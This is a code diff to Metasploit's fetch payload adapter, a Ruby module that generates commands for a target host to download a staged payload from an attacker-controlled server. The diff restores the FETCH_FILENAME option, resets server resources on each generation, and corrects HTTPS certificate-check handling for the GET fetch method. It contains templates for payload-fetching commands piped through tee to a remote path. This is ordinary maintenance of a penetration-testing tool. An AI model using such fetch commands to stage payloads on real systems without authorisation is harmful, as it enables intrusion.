@@ -26,7 +26,7 @@ module Msf::Payload::Adapter::Fetch
         Msf::OptBool.new('FetchHandlerDisable', [true, 'Disable fetch handler', false])
       ]
     )
-    deregister_options('REQUESTED_ARCH', 'FETCH_FILENAME')
+    deregister_options('REQUESTED_ARCH')
     @fetch_service = nil
     @myresources = []
     @srv_resources = []
@@ -108,6 +108,7 @@ module Msf::Payload::Adapter::Fetch
 
   def generate(opts = {})
     if opts[:dynamic_arch].nil?
+      @srv_resources = []
       opts[:arch] ||= module_info['AdaptedArch']
       if opts[:arch] == ARCH_ANY && module_info['AdaptedPlatform'] == 'linux'
         multi_supported_fileless = ['none', 'python3.8+']
@@ -394,9 +395,11 @@ module Msf::Payload::Adapter::Fetch
     when 'HTTP'
       get_file_cmd = "GET -m GET http://#{download_uri(uri)} | tee #{_remote_destination}"
     when 'HTTPS'
-      # There is no way to disable cert check in GET ...
-      print_error('GET binary does not support insecure mode')
-      fail_with(Msf::Module::Failure::BadConfig, 'FETCH_CHECK_CERT must be true when using GET')
+      unless datastore['FETCH_CHECK_CERT']
+        # There is no way to disable cert check in GET ...
+        print_error('GET binary does not support insecure mode')
+        fail_with(Msf::Module::Failure::BadConfig, 'FETCH_CHECK_CERT must be true when using GET')
+      end
       get_file_cmd = "GET -m GET https://#{download_uri(uri)} | tee #{_remote_destination}"
     when 'FTP'
       get_file_cmd = "GET ftp://#{download_uri(uri)} | tee #{_remote_destination}"
